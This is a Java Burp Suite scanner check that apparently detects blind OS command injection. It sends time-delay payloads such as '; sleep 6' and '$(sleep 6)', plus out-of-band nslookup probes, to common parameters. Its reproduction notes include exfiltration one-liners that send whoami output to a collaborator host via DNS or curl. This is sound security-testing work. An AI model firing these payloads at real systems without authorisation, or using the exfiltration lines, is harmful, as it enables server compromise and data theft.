package com.rx0.burp.scanner.checks;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.rx0.burp.model.Finding;
import com.rx0.burp.model.Severity;
import com.rx0.burp.scanner.ScanContext;
import com.rx0.burp.scanner.VulnCheck;

import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

/**
 * OS Command Injection — BLIND, time-based detection: injects "sleep" commands
 * (sleep/timeout) using Unix and Windows shell syntax, and compares the response
 * time against a baseline (the same request without the payload). A consistent
 * delay close to the time requested in the payload is strong evidence that the
 * command is being executed on the server.
 *
 * To reduce false positives, the test only confirms the finding if the delay
 * matches again on a SECOND attempt (avoids flagging a one-off network hiccup).
 *
 * Created by Rx0 - @rodrigocoutinho91
 */
public class OsCommandInjectionCheck implements VulnCheck {

    private static final String[] PARAM_NAMES = {"host", "ip", "domain", "cmd", "file", "name", "ping", "target"};
    private static final int SLEEP_SECONDS = 6;

    private static final String[] PAYLOADS = {
            "; sleep " + SLEEP_SECONDS,
            "| sleep " + SLEEP_SECONDS,
            "`sleep " + SLEEP_SECONDS + "`",
            "$(sleep " + SLEEP_SECONDS + ")",
            "& timeout " + SLEEP_SECONDS, // Windows cmd
            "| ping -n " + (SLEEP_SECONDS + 1) + " 127.0.0.1", // Windows (ping as a delay)
    };

    @Override
    public String name() {
        return "OS Command Injection (blind, time-based)";
    }

    @Override
    public List<Finding> execute(MontoyaApi api, String baseUrl) {
        return execute(api, baseUrl, (ScanContext) null);
    }

    @Override
    public List<Finding> execute(MontoyaApi api, String baseUrl, ScanContext ctx) {
        List<Finding> findings = new ArrayList<>();
        String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;

        // --- OOB confirmation via interactsh: a command that makes the server "call back" ---
        if (ctx != null && ctx.interactsh() != null && ctx.interactsh().isAvailable()) {
            for (String param : new String[]{"host", "cmd", "ip"}) {
                try {
                    String host = ctx.interactsh().createProbe(
                            "OS Command Injection confirmed via out-of-band interaction in parameter '" + param + "'",
                            Severity.CRITICAL,
                            base,
                            "The command injected in parameter '" + param + "' made the server resolve/contact a unique " +
                                    "test domain (via nslookup/curl embedded in the payload) — an unambiguous confirmation of " +
                                    "OS command execution on the server, without relying on time measurement.",
                            "Never pass user input into functions that execute OS commands. Use the language's native " +
                                    "APIs instead of a shell, and if that's unavoidable, use a strict allowlist plus proper escaping.",
                            "1) Reproduce with the exact payload: ; nslookup <generated-host> (or curl http://<generated-host>/ in " +
                                    "environments where curl is available). 2) Once execution is confirmed, escalate to data " +
                                    "exfiltration via DNS: `; nslookup $(whoami).<generated-host>` embeds the command output " +
                                    "in the queried subdomain itself. 3) RCE confirmed — treat as top priority.");
                    if (host != null) {
                        // DNS lookup payload (works both in Unix shells and via nslookup on Windows)
                        String payloadUnix = "; nslookup " + host + " #";
                        String payloadWin = "& nslookup " + host + " & ";
                        for (String payload : new String[]{payloadUnix, payloadWin}) {
                            String url = base + "/?" + param + "=" + URLEncoder.encode(payload, "UTF-8");
                            api.http().sendRequest(HttpRequest.httpRequestFromUrl(url));
                        }
                    }
                } catch (Exception e) {
                    api.logging().logToError("[Rx0] Error firing OS Command Injection OOB probe (param " + param + "): " + e.getMessage());
                }
            }
        }

        // Baseline: normal response time with no payload
        long baselineTime = measureTime(api, base + "/");
        if (baselineTime < 0) return findings;

        for (String param : PARAM_NAMES) {
            for (String payload : PAYLOADS) {
                try {
                    String url = base + "/?" + param + "=" + URLEncoder.encode(payload, "UTF-8");
                    long attempt1 = measureTime(api, url);
                    if (attempt1 < 0) continue;

                    long expectedMs = SLEEP_SECONDS * 1000L;
                    boolean lookedDelayed = (attempt1 - baselineTime) >= (expectedMs - 1500);

                    if (lookedDelayed) {
                        // Confirms on a second attempt to reduce false positives from a one-off network slowdown
                        long attempt2 = measureTime(api, url);
                        boolean confirmed = attempt2 >= 0 && (attempt2 - baselineTime) >= (expectedMs - 1500);

                        if (confirmed) {
                            findings.add(new Finding(
                                    "Possible OS Command Injection (blind) in parameter '" + param + "'",
                                    Severity.CRITICAL,
                                    url,
                                    "Sending a payload with a delay command (" + SLEEP_SECONDS + "s) caused a consistent delay " +
                                            "in the response across TWO separate attempts, compared to the baseline with no payload. This is " +
                                            "strong evidence that the parameter value is executed as an OS command on the server.",
                                    "Payload: " + payload + " | Baseline: " + baselineTime + "ms | Attempt 1: " + attempt1
                                            + "ms | Attempt 2 (confirmation): " + attempt2 + "ms",
                                    "Never pass user input into functions that execute OS commands (exec, system, popen...). " +
                                            "Use the language's native APIs instead of a shell, and if that's unavoidable, use a strict allowlist plus proper escaping.",
                                    "1) Since this is blind (no visible output), manually reconfirm in Repeater by changing the sleep time " +
                                            "(e.g. from " + SLEEP_SECONDS + " to 15s) and check whether the delay scales proportionally — this rules out a network coincidence. " +
                                            "2) To extract data with no output channel, use DNS/HTTP out-of-band exfiltration: a payload like " +
                                            "`; curl http://YOUR-COLLABORATOR.burpcollaborator.net/$(whoami)` using Burp Collaborator to " +
                                            "confirm execution AND capture the command output. 3) This is full RCE — treat it as the highest-priority finding."));
                            break; // confirmed on this param, no need to test the other payloads
                        }
                    }
                } catch (Exception e) {
                    api.logging().logToError("[Rx0] Error in OS Command Injection check (param " + param + "): " + e.getMessage());
                }
            }
        }
        return findings;
    }

    private long measureTime(MontoyaApi api, String url) {
        try {
            long start = System.currentTimeMillis();
            HttpRequest req = HttpRequest.httpRequestFromUrl(url);
            HttpResponse resp = api.http().sendRequest(req).response();
            if (resp == null) return -1;
            return System.currentTimeMillis() - start;
        } catch (Exception e) {
            return -1;
        }
    }
}
